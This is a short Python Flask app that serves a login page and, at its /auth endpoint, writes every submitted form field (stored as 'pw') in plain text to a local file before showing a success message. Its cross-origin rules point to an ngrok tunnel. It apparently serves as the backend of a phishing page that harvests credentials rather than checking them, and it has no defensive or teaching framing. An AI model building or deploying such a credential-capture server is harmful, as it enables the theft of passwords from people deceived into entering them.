from flask import Flask, render_template, send_file, make_response, request, redirect
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/auth": {"origins": "https://dda9-171-79-49-202.ngrok-free.app"}})

@app.route("/login", methods=["POST", "GET"])
def load_login():
    return render_template('index.html')

@app.route("/auth", methods=["POST"])
def authenticate():
    pw = request.form.to_dict()
    print(request.form.to_dict())
    with open("new_file.txt", "w") as file:
        file.write(f'{pw}')
    response = make_response(send_file("templates/index.html"))
    response.headers.add("Access-Control-Allow-Origin", "*")
    return redirect("/success")

@app.route("/success")
def success():
    return "Data has been saved successfully!"

if __name__ == "__main__":
    app.run(debug=False)
